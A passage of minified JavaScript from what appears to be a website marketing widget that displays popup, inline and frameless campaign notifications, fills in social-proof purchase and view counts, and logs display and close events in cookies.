sQuery("#spContent").css("height","100%");}
if(camp.productType==24||camp.productType==28||camp.productType==31){viewType=1;}
else if(camp.productType==32||camp.productType==39||camp.productType==47){}
else if(camp.productType==22)
{viewType=1;sQuery('#spHeader').css('border-radius','0 3px 0 3px');sQuery('.spHeaderNav').text(String.fromCharCode(187));sQuery('#spFrame').css('height','400');(camp.theme==1)?sQuery('#spFrame').css('width','806'):sQuery('#spFrame').css('width','606');(camp.theme==1)?sQuery("#spEvent").css("width","856"):sQuery("#spEvent").css("width","716");sQuery("#spEvent").css("height","400");sQuery("#spContent").css("height","400px");(camp.theme==1)?sQuery("#spEvent").css("left","-806px"):sQuery("#spEvent").css("left","-606px");sQuery("#spFrame",a).attr('src',spApi.frameUrl+"?viewType="+viewType+"&id="+camp.id+app+tmpPageUrl+"&version="+spApi.genDate);}
else
{sQuery('#spFrame').load(function(){sQuery.each(camp.callbacks.show,function(key,callback){spApi.campEventControl('show',callback);});});var tmpPageUrl="&pageUrl="+this.urlencode(window.location.href);sQuery("#spFrame",a).attr('src',spApi.frameUrl+"?viewType="+viewType+"&id="+camp.id+app+tmpPageUrl+"&version="+spApi.genDate);var spContent=sQuery("#spContent");var spEvent=sQuery("#spEvent");var spNotif=sQuery(".sp-fancybox-skin");spEvent.width="210px";sQuery("#spHeader").die("click").live("click",function(){if(spApi.attr.spEvent.left==-3){spApi.animateHideCamp();}else{spApi.animateShowCamp();}});}
if(viewType==1)
{sQuery('#spFrame').attr('src',sQuery('#spFrame').attr('src'));if(camp.productType==28){var seekCrowdy=setInterval(function(){if(typeof spApi.showCrowdyNotification!=="undefined"){spApi.showCrowdyNotification(camp);clearInterval(seekCrowdy);}},100);var locationConfig=spApi.notifies[camp.id].locationConfig;var cssConfig=spApi.notifies[camp.id].cssConfig;}
else if(camp.productType==24&&spApi.notifies[camp.id].locationConfig.frameless==='true'){(function(camp){var effectConfig=spApi.notifies[camp.id].effectConfig;var hasEffect=effectConfig&&effectConfig.open&&effectConfig.close;var gridPositionList={'top-left':'ins-pos-top-left','top-center':'ins-pos-top-center','top-right':'ins-pos-top-right','middle-left':'ins-pos-middle-left','middle-center':'ins-pos-middle-center','middle-right':'ins-pos-middle-right','bottom-left':'ins-pos-bottom-left','bottom-center':'ins-pos-bottom-center','bottom-right':'ins-pos-bottom-right'};var addOuterCss=function(cssText){if(sQuery('.ins-outer-stylesheet-'+camp.id).length>0){sQuery('.ins-outer-stylesheet-'+camp.id).remove();}
var style=document.createElement('style');style.type='text/css';style.className='ins-outer-stylesheet ins-outer-stylesheet-'+camp.id;style.innerHTML=cssText;document.querySelector('head').appendChild(style);};var setJavascriptCode=function(jsCode){if(sQuery('.ins-camp-frameless-js-'+camp.id).length>0){return false;}
var script=document.createElement('script');script.type='text/javascript';script.innerHTML=jsCode;script.className='ins-camp-frameless-js ins-camp-frameless-js-'+camp.id;document.querySelector('head').appendChild(script);};var getPositionClass=function(){var locationConfig=spApi.notifies[camp.id].locationConfig;var xDirection=locationConfig.gridConfig.xDirection;var yDirection=locationConfig.gridConfig.yDirection;return gridPositionList[yDirection+'-'+xDirection];};var getOverlayElement=function(){return sQuery('#ins-frameless-overlay');};var getOverlaySettings=function(){var overlaySettings=spApi.notifies[camp.id].cssConfig;return{'overlay-close':overlaySettings['overlay-close'],'overlay-color':overlaySettings['overlay-color'],'overlay-opacity':overlaySettings['overlay-opacity'],'overlay-visibility':overlaySettings['overlay-visibility']};};var setOverlaySettings=function(){var overlaySettings=getOverlaySettings();var displayOverlay='block';var preventLandscapeElement=sQuery('.ins-prevent-landscape-variable');if(preventLandscapeElement.exists()&&window.innerWidth>window.innerHeight&&preventLandscapeElement.data('value')==='none'){displayOverlay='none';}
getOverlayElement().css({'display':displayOverlay,'opacity':overlaySettings['overlay-opacity'],'background-color':overlaySettings['overlay-color'],});};var showFramelessOverlay=function(campId){var overlaySettings=getOverlaySettings();if(overlaySettings['overlay-visibility']==='true'){sQuery('body').append('<div id="ins-frameless-overlay" close-on-click='+overlaySettings['overlay-close']+' data-camp-id='+campId+'></div>');setOverlaySettings();}};var openWithEffect=function(openEffect){var notificationContent=document.getElementsByClassName('ins-notification-content-'+camp.id)[0];sQuery(notificationContent).effective(openEffect);};var showOnPageTemplate=function(previewWrap){previewWrap.className+=' '+getPositionClass();document.body.appendChild(previewWrap);};var showRelativePositionTemplate=function(locationConfig,previewWrap){var selectedElement=sQuery(locationConfig.relativePosition.element);var $previewContainer=sQuery(previewWrap);var templateMargin=15;function calculatePosition(){var elementPosition={x:selectedElement.offset().left,y:selectedElement.offset().top};var relativePosition={x:parseInt(locationConfig.relativePosition.position.x),y:parseInt(locationConfig.relativePosition.position.y)};var left=elementPosition.x-relativePosition.x-templateMargin;var top=elementPosition.y-relativePosition.y-templateMargin;if(relativePosition.y==0){top=selectedElement.height()+elementPosition.y;}
return{left:left,top:top};}
function calculatePositionForMobileResolution(){$previewContainer.css('top',calculatePosition().top);}
if(!spApi.isMobileBrowser()){var calculatedPosition=calculatePosition();$previewContainer.css({left:calculatedPosition.left,top:calculatedPosition.top,position:'absolute'});}
sQuery(window).resize(function(){if(spApi.isMobileBrowser()){calculatePositionForMobileResolution();}else{var calculatedPosition=calculatePosition();$previewContainer.css({left:calculatedPosition.left,top:calculatedPosition.top});}});sQuery('body').append($previewContainer);if(spApi.isMobileBrowser()){calculatePositionForMobileResolution();}};var showInPageTemplate=function(locationConfig,previewWrap,notificationContent){var $selectedElement=sQuery(locationConfig.selectedElement);var $notificationContainer=sQuery(notificationContent);var $previewContainer=sQuery(previewWrap);$notificationContainer.css({'position':'relative','top':'initial','left':'initial','margin-left':locationConfig.left,'margin-top':locationConfig.top,'display':'inline-block'});$notificationContainer.addClass('inline-resolution');switch(locationConfig.insertAction){case'before':$selectedElement.before($previewContainer);break;case'after':$selectedElement.after($previewContainer);break;case'insert-end':$selectedElement.append($previewContainer);break;case'insert-beginning':$selectedElement.prepend($previewContainer);break;default:break;}};var visibleCampaign=function(locationConfig,previewWrap,campaignData){if(typeof spApi.notifies[camp.id].locationConfig.socialProofCG!=='undefined'&&spApi.notifies[camp.id].locationConfig.socialProofCG==='true'){var logData={key:'sp-camp-'+camp.id,obj:{'step1-displayed':true},campId:camp.id};spApi.updateCookie(logData);}else{sQuery(previewWrap).css({'display':'block','visibility':'visible'}).promise().done(function(){sQuery(document).trigger('framelessCampaignShown'+camp.id);setJavascriptCode(campaignData.javascriptCode);showFramelessOverlay(camp.id);if(typeof hasEffect!=='undefined'&&hasEffect){openWithEffect(effectConfig.open);}
spApi.bindAutoClose(camp,(function(){sQuery(document).trigger('closeCampaign'+camp.id);}));var logData={key:'sp-camp-'+camp.id,obj:{'step1-displayed':true},campId:camp.id};spApi.updateCookie(logData);});}};var checkFirstTriggerStatus=function(notifySettings){var firstTrigger=false;var campCookie=spApi.storageData('sp-camp-'+camp.id);var triggerHide=false;if(campCookie!==null){campCookie=JSON.parse(campCookie);triggerHide=campCookie.triggerHide;}
if(triggerHide===false||triggerHide===undefined){if(notifySettings.triggerIsActive==='1'&&camp.trigTimeOut==='-1'){firstTrigger=true;}else{firstTrigger=false;}}else if(triggerHide=='1'){firstTrigger=false;}else if(triggerHide=='0'){firstTrigger=true;}
return firstTrigger;};var showFramelessCampaign=function(campaignData){addOuterCss(campaignData.outerCss);var notifySettings=spApi.notifies[camp.id];var locationConfig=notifySettings.locationConfig;var previewWrap=document.createElement('div');previewWrap.className='ins-preview-wrapper ins-preview-wrapper-'+camp.id;var contentWrapper=document.createElement('div');contentWrapper.className='ins-content-wrapper ins-content-wrapper-'+camp.id;var notificationContent=document.createElement('div');notificationContent.className='ins-notification-content ins-notification-content-'+camp.id;notificationContent.setAttribute('data-camp-id',camp.id);sQuery.each(spApi.notifies[camp.id].cssConfig,function(property,value){notificationContent.style.setProperty(property,value,'important');});previewWrap.style.setProperty('display','none');previewWrap.style.setProperty('visibility','hidden');previewWrap.appendChild(contentWrapper);contentWrapper.appendChild(notificationContent);notificationContent.innerHTML=campaignData.content;if(locationConfig.type=='2'){showInPageTemplate(locationConfig,previewWrap,notificationContent);}else if(locationConfig.gridIsActive=='true'){showOnPageTemplate(previewWrap);}else if(locationConfig.relativePositioning=='true'){showRelativePositionTemplate(locationConfig,previewWrap);}
var framelessEvent=document.createEvent('CustomEvent');framelessEvent.initCustomEvent('framelessReady',true,true,{campID:camp.id});document.dispatchEvent(framelessEvent);if(notifySettings.triggerIsActive=='1'){spApi.setTrigger(notifySettings.triggerSettings,function(){visibleCampaign(locationConfig,previewWrap,campaignData);});}
if(spApi.notifies[camp.id].waitForKKBData){esCountAnalytics(function(countAnalytics){esLiveFeed(function(liveFeed){var socialProofData=spApi.notifies[camp.id].socialProofSettings;var minimum=socialProofData.min;var maximum=socialProofData.max;var random=socialProofData.random;var textArea=campaignData.content;var showSocialProofCamp=false;var lastPurchaseRequired=false;function createLastPurchaseData(lastPurchasedDate){if(typeof maximum==='undefined'||typeof minimum==='undefined'){return 0;}
var lastPurchase=new Date(lastPurchasedDate);var now=new Date();var diff=now-lastPurchase;var totalMinutes=Math.ceil((now.getTime()-lastPurchase.getTime())/(1000*60));var diffInDays=Math.floor(diff/86400000);var diffInHours=Math.floor((diff%86400000)/3600000);var diffInMinutes=Math.round(((diff%86400000)%3600000)/60000);if(totalMinutes<minimum['@lastPurchase']||totalMinutes>maximum['@lastPurchase']){return false;}
var purchaseString='';var dateTrans=typeof spApi.translations[camp.lang]!=='undefined'?spApi.translations[camp.lang].date:spApi.translations['en_US'].date;if(diffInDays>0){purchaseString+=diffInDays+' '+spApi.pluralForm.get(camp.lang,diffInDays,dateTrans.form1.day,(dateTrans.form2||[]).day,(dateTrans.form3||[]).day,(dateTrans.form4||[]).day).toLowerCase()+' ';}
if(diffInHours>0){purchaseString+=diffInHours+' '+spApi.pluralForm.get(camp.lang,diffInHours,dateTrans.form1.hour,(dateTrans.form2||[]).hour,(dateTrans.form3||[]).hour,(dateTrans.form4||[]).hour).toLowerCase()+' ';}
if(diffInMinutes>0){purchaseString+=diffInMinutes+' '+spApi.pluralForm.get(camp.lang,diffInMinutes,dateTrans.form1.minute,(dateTrans.form2||[]).minute,(dateTrans.form3||[]).minute,(dateTrans.form4||[]).minute).toLowerCase();}
if(purchaseString.legnth==0){return false;}
return purchaseString;};var kkbData={'@instantView':countAnalytics.instantView,'@dailyView':countAnalytics.dailyView,'@dailyPurchase':liveFeed.purchase.dailyPurchase,'@instantPurchase':liveFeed.purchase.instantPurchase,'@inBasketCount':liveFeed.inBasketCount,'@lastPurchase':createLastPurchaseData(liveFeed.lastPurchasedDate)};sQuery.each(spApi.notifies[camp.id]['kkbSettings'],function(key,value){if(key==='@lastPurchase'&&kkbData[key]!=false&&textArea.indexOf(key)>-1){textArea=textArea.replace(new RegExp(key,'g'),kkbData[key]);showSocialProofCamp=true;}
if(key==='@lastPurchase'&&kkbData[key]==false&&textArea.indexOf(key)>-1){lastPurchaseRequired=true;}
if(key!=='@lastPurchase'){if(textArea.indexOf(key)>-1&&kkbData[key]>0&&minimum[key]<=kkbData[key]){textArea=textArea.replace(new RegExp(key,'g'),kkbData[key]);showSocialProofCamp=true;}else if(textArea.indexOf(key)>-1&&minimum[key]>=kkbData[key]){showSocialProofCamp=false;}}});notificationContent.innerHTML=textArea;if(showSocialProofCamp&&!lastPurchaseRequired){if(spApi.checkConditionNeed(camp)){spApi.setConditionCallback(camp,function(){visibleCampaign(locationConfig,previewWrap,campaignData);});}else{visibleCampaign(locationConfig,previewWrap,campaignData);}}});},camp.id);}else{if(spApi.checkConditionNeed(camp)){if(checkFirstTriggerStatus(notifySettings)){spApi.setConditionCallback(camp,function(){spApi.showTrigger(camp.id,notifySettings.triggerSettings);});}else{spApi.setConditionCallback(camp,function(){visibleCampaign(locationConfig,previewWrap,campaignData);});}}else{if(checkFirstTriggerStatus(notifySettings)){spApi.showTrigger(camp.id,notifySettings.triggerSettings);}else{visibleCampaign(locationConfig,previewWrap,campaignData);}}}
var bindFramelessCampaignCallback=function(type){sQuery.each(camp.callbacks[type],function(key,callback){spApi.campEventControl(type,callback);});};bindFramelessCampaignCallback('show');sQuery(document).on('framelessClose'+camp.id,function(){bindFramelessCampaignCallback('close');});};window['getFramelessData'+camp.id]=function(){};var getFramelessCampaignData=function(){sQuery.ajax({url:spApi.apiUrl+'ajax.php?t=getFramelessData',type:'GET',data:{campID:camp.id,genDate:spApi.genDate},dataType:'jsonp',async:spApi.isAjaxAsync,jsonpCallback:'getFramelessData'+camp.id,success:function(campaignData){setTimeout(function(){showFramelessCampaign(campaignData);},camp.trigTimeOut*1000);}});};var loadFramelessJS=function(){if(sQuery('#ins-frameless-js').length>0){getFramelessCampaignData();return;}
var script=document.createElement('script');script.setAttribute('id','ins-frameless-js');script.addEventListener('load',getFramelessCampaignData,false);document.getElementsByTagName('head')[0].appendChild(script);script.setAttribute('src',spApi.staticUrl+'js/frameless.min.js?v=1.0.5');}
if(sQuery('.ins-frameless-css-'+camp.id).length>0){getFramelessCampaignData();}else{sQuery('.ins-frameless-css-'+camp.id).remove();var link=document.createElement('link');link.setAttribute('class','ins-frameless-css ins-frameless-css-'+camp.id);link.setAttribute('rel','stylesheet');link.setAttribute('type','text/css');link.setAttribute('media','screen');link.addEventListener('load',loadFramelessJS,false);document.getElementsByTagName('head')[0].appendChild(link);link.setAttribute('href',spApi.staticUrl+'css/frameless.css?v=0.2');}})(camp);}
else if(camp.productType==24&&spApi.notifies[camp.id].locationConfig.type!='2'){sQuery('#spEvent').hide();var overlayClose=false;var notifySettings=spApi.notifies[camp.id];var couponStatus=spApi.notifies[camp.id].notifCpnStatus;var couponSection='t=getInfoCoupon';var notificationFunctions={highlightElement:function(config){var highlightConfig=config.highlightConfig;var effectConfig=config.effectConfig;highlightConfig.onClose=function(){var cookieData={key:'sp-camp-'+camp.id,obj:{'closed':true},campId:camp.id};spApi.updateCookie(cookieData);spApi.worker.send('do-logging',{type:'camp-step1-close',campId:camp.id});if(effectConfig instanceof Object&&typeof effectConfig.close!=="undefined"){effectConfig.close.dialog.complete=function(){sQuery.fancybox.close();}
sQuery('.sp-fancybox-inner').effective(effectConfig.close);}else{sQuery.fancybox.close();}};highlightConfig.paddingLeft=Number(highlightConfig.paddingLeft);highlightConfig.paddingTop=Number(highlightConfig.paddingTop);highlightConfig.scroll=sQuery.parseJSON(highlightConfig.scroll);highlightConfig.closeOnEsc=sQuery.parseJSON(highlightConfig.closeOnEsc);highlightConfig.closeOnClick=sQuery.parseJSON(highlightConfig.closeOnClick);spApi.highlight(highlightConfig.highlightedElements[0],highlightConfig);if(typeof highlightConfig.highlightedElements!=='undefined'&&highlightConfig.highlightedElements.length>0){var highlightedElements=highlightConfig.highlightedElements.join();}else{var highlightedElements='';}
sQuery(highlightConfig.highlightedElements[0]+','+highlightedElements).live('click',function(){var cookieData={key:'sp-camp-'+camp.id,obj:{'joined':true},campId:camp.id};spApi.updateCookie(cookieData);spApi.worker.send('do-logging',{type:'camp-join',campId:camp.id});sQuery.fancybox.close();spApi.mask.closeSlient();});},visibleNotification:function(element,config){sQuery('#insBeforeStyle').remove();pm({target:sQuery(element+' .sp-fancybox-iframe')[0].contentWindow,type:'resizeTrigger'});sQuery(element+' .sp-fancybox-overlay').css('visibility','visible');sQuery(element).css({"display":"block","visibility":"visible"}).promise().done(function(){if(config.effectConfig instanceof Object){if(typeof config.effectConfig.open!="undefined"){sQuery(element+' .sp-fancybox-skin').effective(config.effectConfig.open);}}
if(typeof config!=="undefined"&&config.locationConfig.type=='3'){notificationFunctions.highlightElement(config);}
var logData={key:'sp-camp-'+camp.id,obj:{'step1-displayed':true},campId:camp.id};spApi.updateCookie(logData);if(couponStatus=='1'&&spApi.checkConditionNeed(camp)){getCouponCode();}
spApi.bindAutoClose(camp);sQuery.each(camp.callbacks.show,function(key,callback){spApi.campEventControl('show',callback);});try{pm({target:sQuery(element+' .sp-fancybox-iframe')[0].contentWindow,type:'startCountdown'});}catch(err){spApi.errLog(err,{logType:'startCountdown',bugType:'partner',extraData:{campId:camp.id,element:element}});}});},hideNotification:function(element){var cookieData={key:'sp-camp-'+spApi.activeCamp.id,obj:{'triggerHide':'0'},campId:camp.id};spApi.updateCookie(cookieData);if(typeof spApi.mask.isLoaded()!=="undefined"){spApi.mask.closeSlient();}
sQuery(element).css({"display":"none","visibility":"hidden"});},showNotification:function(){sQuery('body').append('<style id="insBeforeStyle">.sp-fancybox-wrap {top: -9999px !important; }</style>');var urlParams='';if(spApi.checkConditionNeed(camp)){urlParams+='&campType=bounce';}
function setZoomLevelOfNotification(){sQuery('.sp-fancybox-wrap').css({'zoom':(100/sQuery('body').css('zoom'))/100});}
sQuery(window).resize(function(){setZoomLevelOfNotification();});sQuery.fancybox({fitToView:false,autoSize:false,closeClick:false,padding:0,margin:0,openEffect:'none',openSpeed:1500,scrolling:'no',closeEffect:'none',helpers:{overlay:null},keys:{next:null,prev:null,toggle:null,play:null},type:'iframe',href:spApi.frameUrl+"?viewType=1&id="+camp.id+"&appType="+camp.productType+"&pageUrl="+spApi.urlencode(window.location.href)+urlParams+"&version="+spApi.genDate,beforeShow:function(){sQuery('.sp-fancybox-wrap').css('visibility','hidden');setZoomLevelOfNotification();sQuery('.sp-fancybox-wrap').addClass('sp-advanced-css-'+camp.id);var advancedCssClass='.sp-advanced-css-'+camp.id
sQuery(advancedCssClass+' .sp-fancybox-iframe').load(function(){sQuery(advancedCssClass+' .sp-fancybox-iframe').pm(function(){return iframeConfig;},function(config){var cssConfig=config.cssConfig;var locationConfig=config.locationConfig;var highlightConfig=config.highlightConfig;var effectConfig=config.effectConfig;var allConfig={cssConfig:cssConfig,locationConfig:locationConfig,highlightConfig:highlightConfig,effectConfig:effectConfig};var positionSettings={positionLeft:locationConfig.left,positionTop:locationConfig.top,positionType:locationConfig.type,spWindowWidth:locationConfig.windowWidth,spWindowHeight:locationConfig.windowHeight}
var location={positionLeft:Number(positionSettings.positionLeft),positionTop:Number(positionSettings.positionTop),positionType:Number(positionSettings.positionType),position:locationConfig.position,spWindowWidth:Number(positionSettings.spWindowWidth),spWindowHeight:Number(positionSettings.spWindowHeight),selectedElement:locationConfig.selectedElement};overlayClose=cssConfig.overlayClose;var gridIsActive=typeof locationConfig.gridIsActive!=='undefined'?(locationConfig.gridIsActive===true||locationConfig.gridIsActive==='true'):false;var positionTop,positionRight,positionBottom,positionLeft,positionFixed,margins;if(gridIsActive&&config.mode!='adaptive'){positionTop=locationConfig.top;positionLeft=locationConfig.left;positionRight='right: '+locationConfig.right+' !important;';positionBottom='bottom: '+locationConfig.bottom+' !important;';positionFixed='fixed';margins='margin-left: '+locationConfig.marginLeft+' !important; margin-top: '+locationConfig.marginTop+' !important;';}else{var position=spApi.getPositionOfTheCamp(location,cssConfig);positionTop=position.positionTop+'px';positionLeft=position.positionLeft+'px';positionRight='';positionBottom='';margins='';}
sQuery('body').append('<style>'+
advancedCssClass+' .sp-fancybox-skin { background-color: transparent !important; box-shadow: '+'0 0 0 0'+' !important; z-index: 999999}'+
advancedCssClass+' .sp-fancybox-close { display: none !important; }'+
advancedCssClass+' .sp-fancybox-iframe { border-radius: '+cssConfig.borderRadius+' !important; border-width: '+cssConfig.borderWidth+' !important; border-style: '+cssConfig.borderStyle+' !important; border-color: '+cssConfig.borderColor+' !important; -webkit-box-sizing: border-box !important; -moz-box-sizing: border-box !important; box-sizing: border-box !important; }'+
advancedCssClass+' .sp-fancybox-inner { overflow: hidden !important; box-shadow: '+cssConfig.shadow+' !important; border-radius: '+cssConfig.borderRadius+' !important;}'+'</style>');if(config.mode=='adaptive'){sQuery('.sp-fancybox-wrap, .sp-fancybox-skin, .sp-fancybox-outer, .sp-fancybox-inner, .sp-fancybox-iframe').addClass('adaptive-resolution');sQuery('.sp-fancybox-wrap').addClass('adaptive-position');if(gridIsActive){sQuery('.sp-fancybox-wrap').addClass(locationConfig.xPositionClass).addClass(locationConfig.yPositionClass);}
if(cssConfig.autofitSizeReference){sQuery('.sp-fancybox-inner','.sp-advanced-css-'+camp.id).css({'max-width':cssConfig.autofitSizeReference['max-width']+'px','max-height':cssConfig.autofitSizeReference['max-height']+'px','width':'100%'});sQuery('body').append('<style>'+
advancedCssClass+' .adaptive-resolution, '+advancedCssClass+'.adaptive-resolution { max-width: '+cssConfig.autofitSizeReference['max-width']+'px !important; max-height: '+cssConfig.autofitSizeReference['max-height']+'px !important;'+'</style>');sQuery(window).resize((function context(){if(!sQuery('.sp-fancybox-inner','.sp-advanced-css-'+camp.id).exists())
return;var originalWidth=Number(sQuery('.sp-fancybox-inner','.sp-advanced-css-'+camp.id).css('max-width').replace('px',''));var originalHeight=Number(sQuery('.sp-fancybox-inner','.sp-advanced-css-'+camp.id).css('max-height').replace('px',''));var viewportWidth=sQuery(window).width();var newHeight=(originalHeight*viewportWidth)/originalWidth;if(originalWidth<=sQuery(window).width())
newHeight=originalHeight;sQuery('.adaptive-autofit-css-'+camp.id).remove();sQuery('body').append('<style class="adaptive-autofit-css-'+camp.id+'">'+
advancedCssClass+' .adaptive-resolution, '+advancedCssClass+'.adaptive-resolution { '+'height: '+newHeight+'px !important; '+'width: 100% !important;'+'</style>');return context;})());}
if(typeof config.adaptiveSettings.outerCss!=='undefined'){sQuery('body').append('<style id="insider-outer-css">'+
config.adaptiveSettings.outerCss+'.insider-ios-fixed { position: absolute !important; top: 0 !important; margin-top: 10px !important; }'+'</style>');}}else{var notificationPosition=typeof positionFixed!=='undefined'?'position: '+positionFixed+'!important;':'position: absolute!important;';sQuery('body').append('<style>'+
advancedCssClass+', '+advancedCssClass+' .sp-fancybox-inner { width: '+cssConfig.width+'px !important; }'+
advancedCssClass+' { top: '+positionTop+' !important; left: '+positionLeft+' !important; '+positionRight+positionBottom+notificationPosition+margins+'}'+'</style>');sQuery('body').append('<style id="insdrInfoHeightStyle-'+camp.id+'">'+
advancedCssClass+' .sp-fancybox-inner { height: '+cssConfig.height+'px !important; }'+'</style>');}
if(cssConfig.overlay=='block'||cssConfig.overlay==1){sQuery('body').append('<style>'+advancedCssClass+' .sp-fancybox-overlay { width: 100%; height: 100%; position: fixed !important; top: 0; left: 0; z-index: 99999 !important; display: '+cssConfig.overlay+' !important; background-color: '+cssConfig.overlayColor+' !important; opacity: '+cssConfig.overlayOpacity+' !important; } </style>');sQuery(advancedCssClass).append('<div class="sp-fancybox-overlay"></div>');}
if(overlayClose==='true'){sQuery(advancedCssClass+' .sp-fancybox-overlay').live('click',function(){if(spApi.storageData('sp-camp-'+camp.id)==null||JSON.parse(spApi.storageData('sp-camp-'+camp.id)).liked!=true){var data={key:'sp-camp-'+camp.id,obj:{'closed':true},campId:camp.id};spApi.updateCookie(data);spApi.worker.send('do-logging',{type:'camp-step1-close',campId:camp.id});}
if(effectConfig instanceof Object&&typeof effectConfig.close!=="undefined"){effectConfig.close.dialog.complete=function(){sQuery.fancybox.close();}
sQuery(advancedCssClass+' .sp-fancybox-skin').effective(effectConfig.close);}else{sQuery.fancybox.close();}});}
sQuery(advancedCssClass).css('display','none');var firstTrigger=false;if(notifySettings.triggerIsActive=='1'){pm.bind('hideInfo',function(){notificationFunctions.hideNotification(advancedCssClass);spApi.showTrigger(camp.id,notifySettings.triggerSettings)});spApi.setTrigger(notifySettings.triggerSettings,function(){notificationFunctions.visibleNotification('.sp-fancybox-wrap',allConfig);});}
var cCookie=spApi.storageData('sp-camp-'+camp.id);var triggerHide=false;if(cCookie!==null){cCookie=JSON.parse(cCookie);triggerHide=cCookie.triggerHide;}
var productType=parseInt(camp.productType);if(triggerHide===false||triggerHide===undefined){if(notifySettings.triggerIsActive==='1'&&camp.trigTimeOut==='-1'){firstTrigger=true;}else{firstTrigger=false;}}else if(triggerHide=='1'){firstTrigger=false;}else if(triggerHide=='0'){firstTrigger=true;}
if(spApi.checkConditionNeed(camp)){if(firstTrigger){spApi.setConditionCallback(camp,function(){spApi.showTrigger(camp.id,notifySettings.triggerSettings)});}else{spApi.setConditionCallback(camp,function(){notificationFunctions.visibleNotification(advancedCssClass,allConfig)});}}else{if(firstTrigger){spApi.showTrigger(camp.id,notifySettings.triggerSettings);}else{notificationFunctions.visibleNotification(advancedCssClass,allConfig);}}});});}});},showIFramelessNotification:function(){var notifyContent=notifySettings.content;var notifyClass='sp-inner-'+camp.id;var classAddedContent=sQuery(notifyContent).find('div:eq(0)').parent().addClass(notifyClass);sQuery('body').append(classAddedContent);sQuery('.'+notifyClass).css({'top':notifySettings.locationConfig.positionTop,'left':notifySettings.locationConfig.positionLeft,'position':notifySettings.cssConfig.fixed==1?'fixed':'absolute'}).show();sQuery.each(camp.callbacks.show,function(key,callback){spApi.campEventControl('show',callback);});sQuery('.sp-inner-notification-close').live('click',function(){notificationFunctions.notificationSendCloseLog(camp);$(this).parent().remove();});},notificationSendCloseLog:function(camp){var data={key:'sp-camp-'+camp.id,obj:{'closed':true},campId:camp.id};spApi.updateCookie(data);spApi.worker.send('do-logging',{type:'camp-step1-close',campId:camp.id});sQuery.each(camp.callbacks.close,function(key,callback){spApi.campEventControl('close',callback);});}};setTimeout(function(){notificationFunctions.showNotification();},camp.trigTimeOut*1000);}
else if(camp.productType==24&&spApi.notifies[camp.id].locationConfig.type=='2'){var notifySettings=spApi.notifies[camp.id];var couponStatus=spApi.notifies[camp.id].notifCpnStatus;var couponSection='t=getInfoCoupon';if(notifySettings.locationConfig.selectedElement=='html'||!(sQuery(notifySettings.locationConfig.selectedElement).length>0)){if(notifySettings.locationConfig.selectedElement=='html'){var errorData={name:"Inline mode positioning",message:"Selector is "+notifySettings.locationConfig.selectedElement+", campaign didn't show. Camp ID: "+camp.id}
var thisData={logType:'Inline Error'};spApi.errLog(errorData,thisData);}
return false;}
var insdrInlineDiv=sQuery('<div/>',{'class':'sp-inline-wrap sp-inline-wrap-'+camp.id+' sp-advanced-css-'+camp.id,'style':'visibility: hidden;'});var urlParams='';if(spApi.checkConditionNeed(camp)){urlParams+='&campType=bounce&notifyType=inline';}
var insdrInlineIframe=sQuery('<iframe/>',{'class':'sp-inline-iframe sp-inline-iframe-'+camp.id,'style':'display: block; visibility: hidden; width: 0px; height: 0px; border:none;','src':spApi.frameUrl+"?viewType=1&id="+camp.id+"&appType=24"+"&pageUrl="+spApi.urlencode(window.location.href)+urlParams+"&version="+spApi.genDate,'frameBorder':'0'});var inlineNotificationFunctions={visibleNotification:function(element){sQuery('.sp-inline-wrap-'+camp.id).css({"display":"inline-block","visibility":"visible"});sQuery(element).css({"display":"block","visibility":"visible"}).promise().done(function(){var effectConfig=notifySettings.effectConfig;if(effectConfig instanceof Object&&typeof effectConfig.open!="undefined"){sQuery('.sp-inline-wrap-'+camp.id).effective(effectConfig.open);}
var logData={key:'sp-camp-'+camp.id,obj:{'step1-displayed':true},campId:camp.id};spApi.updateCookie(logData);if(couponStatus=='1'&&spApi.checkConditionNeed(camp)){getCouponCode(true);}
spApi.bindAutoClose(camp);sQuery.each(camp.callbacks.show,function(key,callback){spApi.campEventControl('show',callback);});try{pm({target:sQuery('.sp-inline-iframe-'+camp.id)[0].contentWindow,type:'startCountdown'});}catch(err){spApi.errLog(err,{logType:'startCountdown',bugType:'partner',extraData:{campId:camp.id,element:element}});}});},showNotification:function(){if(sQuery('.sp-inline-wrap-'+camp.id).length>0){sQuery('.sp-inline-wrap-'+camp.id).remove();}
var insertAction=notifySettings.locationConfig.insertAction;var selectedElement=notifySettings.locationConfig.selectedElement;if(insertAction=='after'){sQuery(selectedElement).after(insdrInlineDiv);}
else if(insertAction=='before'){sQuery(selectedElement).before(insdrInlineDiv);}
else if(insertAction=='insert-end'){sQuery(selectedElement).append(insdrInlineDiv);}
else if(insertAction=='insert-beginning'){sQuery(selectedElement).prepend(insdrInlineDiv);}
sQuery('.sp-inline-wrap-'+camp.id).append(insdrInlineIframe);sQuery(insdrInlineIframe).on('load',function(){sQuery('.sp-inline-iframe-'+camp.id).pm(function(){return inlineConfig;},function(data){sQuery('body').append('<style>'+'.sp-inline-wrap { position: relative; top: initial; left: initial; z-index: 9999999; display: initial; }'+'</style>');if(data.adaptiveSettings!=null&&typeof data.adaptiveSettings.outerCss!=='undefined'){sQuery('body').append('<style id="insider-outer-css">'+
data.adaptiveSettings.outerCss+'.insider-ios-fixed { position: absolute !important; top: 0 !important; margin-top: 10px !important; }'+'</style>');sQuery('.sp-inline-wrap-'+camp.id).addClass('inline-resolution');}
if(camp.productType==24){sQuery('.sp-inline-wrap-'+camp.id).css({'margin-left':data.locationConfig.left+'px','margin-top':data.locationConfig.top+'px','box-shadow':data.cssConfig.shadow,'border-radius':data.cssConfig.borderRadius,'border-style':data.cssConfig.borderStyle,'border-width':data.cssConfig.borderWidth,'border-color':data.cssConfig.borderColor,'display':'none'});sQuery('.sp-inline-iframe-'+camp.id).css({'width':data.width-(parseFloat(data.cssConfig.borderWidth)*2),'height':data.height-(parseFloat(data.cssConfig.borderWidth)*2),'visibility':'hidden','display':'none','border-radius':data.cssConfig.borderRadius});pm({target:sQuery('.sp-inline-iframe-'+camp.id)[0].contentWindow,type:'initView'});}
if(spApi.checkConditionNeed(camp)){spApi.setConditionCallback(camp,function(){inlineNotificationFunctions.visibleNotification('.sp-inline-iframe-'+camp.id);});}else{inlineNotificationFunctions.visibleNotification('.sp-inline-iframe-'+camp.id);}});});}};setTimeout(function(){inlineNotificationFunctions.showNotification();},camp.trigTimeOut*1000);}}
if(viewType==0)
{sQuery('.spHeaderNav').text(String.fromCharCode(187));if(camp.trigTimeOut==0){var afterPaymentPageControl=!spApi.isOnAfterPaymentPage();if(!spApi.spCampCheckStatus(camp.id,'sc')&&afterPaymentPageControl){setTimeout("spApi.animateShowCamp()",400);}}
